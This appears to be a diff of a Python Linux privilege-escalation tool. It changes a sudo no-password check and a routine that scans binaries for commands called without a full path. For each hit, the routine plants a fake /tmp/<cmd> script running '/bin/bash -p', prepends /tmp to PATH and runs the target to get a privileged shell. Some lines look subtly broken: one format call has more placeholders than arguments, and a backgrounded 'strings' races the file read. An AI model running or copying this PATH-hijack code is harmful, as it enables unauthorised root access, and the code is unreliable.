@@ -263,12 +263,16 @@ def disable_hist():
 # check if user needs password to run sudo
 def pass_check():
    # check to see if user needs password to run sudo
-   os.system("time timeout -k 5 5 sudo -l > /tmp/time.txt")
-   if sudo_time > float('1.0'):
-     sudo_no_pass = False
-   else:
-      sudo_no_pass = True
-      print("\n-+- password not needed to run sudo commands -+-")
+   os.system("timeout -k 5 5 sudo -l")
+   os.system("echo $? > /tmp/time.txt")
+   with open("/tmp/time.txt") as sc:
+      ss = sc.readlines()
+      s = ss[0].strip()
+      if s == "0":
+         sudo_no_pass = True
+         sprint("\n-+- password not needed to run sudo commands -+-")
+      else:   
+         sudo_no_pass = False
    return sudo_no_pass
 
 
@@ -436,14 +440,14 @@ def path():
       for line in lines:
          split_path = line.split("/")
          split_path_1 = split_path[-1].strip()
-         os.system("strings {} > /tmp/.path/root_{}".format(line,split_path_1))
+         os.system("strings {} > /tmp/.path/root_{} &".format(line,split_path_1))
          with open("/tmp/.path/root_{}".format(split_path_1)) as strings_file:
             lines_strings = strings_file.readlines()
             for item in lines_strings:
                for cmd in common_cmds:
                   non_path_cmd = re.search("\s{}\s".format(cmd), str(item))
                   if non_path_cmd:
-                     print("### {} does not specify full path of {} ###".format(line,cmd))
+                     #print("### {} does not specify full path of {} ###".format(line,cmd))
                      os.system("echo '### {} does not specify full path of {} ###' >> /tmp/path_res.txt".format(line,cmd))
                      os.system("touch /tmp/{}&&echo '#!/bin/bash' > /tmp/{}&&echo '/bin/bash -p' >> /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
                      break
